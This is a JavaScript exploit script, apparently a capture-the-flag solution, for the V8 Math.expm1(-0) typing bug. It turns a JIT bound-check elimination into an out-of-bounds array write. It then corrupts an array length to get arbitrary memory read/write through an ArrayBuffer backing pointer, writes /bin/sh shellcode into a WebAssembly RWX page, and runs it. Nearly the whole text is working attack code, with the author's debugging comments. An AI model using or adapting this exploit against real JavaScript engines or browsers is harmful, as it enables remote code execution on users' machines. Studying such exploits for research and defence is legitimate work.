function dp(x){}//{%DebugPrint(x);}
const print = console.log;
const assert = function (b, msg)
{
	if (!b)
		throw Error(msg);
};
const buf8 = new ArrayBuffer(8);
const f64 = new Float64Array(buf8);
const u32 = new Uint32Array(buf8);
function d2u(val)
{ //double ==> Uint64
	f64[0] = val;
	let tmp = Array.from(u32);
	return tmp[1] * 0x100000000 + tmp[0];
}
function u2d(val)
{ //Uint64 ==> double
	let tmp = [];
	tmp[0] = parseInt(val % 0x100000000);
	tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
	u32.set(tmp);
	return f64[0];
}
const hex = (x) => ("0x" + x.toString(16));
function getWMain()
{
	const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	const wasmModule = new WebAssembly.Module(wasmCode);
	const wasmInstance = new WebAssembly.Instance(wasmModule, {});
	return wasmInstance.exports.main;
}
wmain = getWMain();

//Object.is(Math.expm1(-0), -0)
function f(v)
{
	const arr = [1.1, 2.2, 3.3];
	const a2 = [13.37];
	const ab = new ArrayBuffer(0x123);
	const sig = {a:0xdead,b:0xbeef,c:wmain};
	// so that they are adjacent on heap
	const o = {z1:-0};
	let res = Object.is(Math.expm1(v), o.z1);
	// if we can prevent constant folding
	// expect res to be false, actual true
	gOobArr = a2;
	gSig = sig;
	gAb = ab; // export these 3 objects to global
	// expect 0, actual 123
	arr[res * 9] = 1.04380972957581745180328891149E-310;
	// write length to Smi(0x1337)
	return arr[res * 9];
}

for (var i = 0; i < 0x4000; i++)
{
	f("a");
	// why do we still have deopt
	// even if we are always passing "a"?
}

print(f(-0));
// cause OOB write in JIT code

// 1. why do we need f(1337) at then beginning?
//	things does not work if we put -0 instead
//	and does not work even if we put both
// 2. why does this work only for array size > 2
//	when size == 2, it will return 2.2
//	which does not make sense!
// 3. when it succeed, why is range still (0,1337)?
//	and why does this eliminate bound check???
// https://mem2019.github.io/jekyll/update/2019/09/05/Problems-About-Expm1.html

if(gOobArr.length !== 0x1337)
	throw Error("failed to corrupt array size!");
dp(gOobArr);
dp(gAb);

// now gOobArr have OOB access
// next, we find ArrayBuffer and sig
var backingPos, wmainAddr;
for (let i = 0; i < gOobArr.length-2; i++)
{
	if (d2u(gOobArr[i]) === 0x123)
	{// find ArrayBuffer
		backingPos = i + 1;
	}
	else if (d2u(gOobArr[i]) === 0xdead00000000 &&
		d2u(gOobArr[i+1]) === 0xbeef00000000)
	{// find sig object, and extract wmain address
		wmainAddr = d2u(gOobArr[i+2]) - 1;
	}
	if (backingPos !== undefined && wmainAddr !== undefined)
		break; // otherwise GC is triggered
}

assert(backingPos !== undefined, "failed to find ArrayBuffer");
assert(wmainAddr !== undefined, "failed to find sig array");
print("[*] index of backing field = " + hex(backingPos));
print("[*] address of wmain function = " + hex(wmainAddr));

const dataView = new DataView(gAb);
function memRead(addr)
{
	gOobArr[backingPos] = u2d(addr);
	return d2u(dataView.getFloat64(0, true));
}
// so now we can rewrite backing field
// to acheive arbitrary read

rwxAddr = memRead(wmainAddr - 0xf8);
// by debugging,
// wmainAddr-0xf8 seems store the rwx page address

dp(gAb);

print("[*] RWX page = " + hex(rwxAddr));

gOobArr[backingPos] = u2d(rwxAddr);
// set backing field to rwx page

var shellcode = [
    0x99583b6a, 0x2fbb4852,
    0x6e69622f, 0x5368732f,
    0x57525f54, 0x050f5e54
];
for (var i = 0; i < shellcode.length; i++)
{
	dataView.setUint32(i * 4, shellcode[i], true);
}
// write shellcode to rwx page

wmain();
// execute the shellcode
readline();
throw Error("failed to get shell");

